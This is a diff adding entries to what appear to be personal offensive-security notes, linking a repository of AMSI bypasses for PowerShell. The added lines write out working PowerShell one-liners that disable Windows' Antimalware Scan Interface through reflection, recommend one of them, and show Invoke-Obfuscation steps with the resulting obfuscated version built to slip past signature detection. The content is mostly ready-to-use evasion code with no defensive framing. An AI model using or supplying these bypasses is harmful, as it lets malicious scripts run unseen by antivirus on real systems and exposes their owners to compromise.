@@ -239,3 +239,28 @@ Babel
 
 ----
 https://github.com/pracsec/AmsiScanner/tree/main/src
+
+https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patching-Clr
+
+```powershell
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
+```
+
+Use this one:
+
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+>Invoke-obfuscation
+>set scriptblock [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+>token
+>string
+>2
+
+output =
+```powershell
+[Ref].Assembly.GetType(("{6}{4}{10}{3}{5}{7}{0}{11}{2}{1}{8}{9}"-f'.Auto','U','.Amsi','g','tem.','eme','Sys','nt','ti','ls','Mana','mation')).GetField(("{0}{1}{2}" -f 'amsi','InitFa','iled'),("{1}{0}{4}{2}{3}" -f'c','NonPubli','t','ic',',Sta')).SetValue($null,$true)
+```
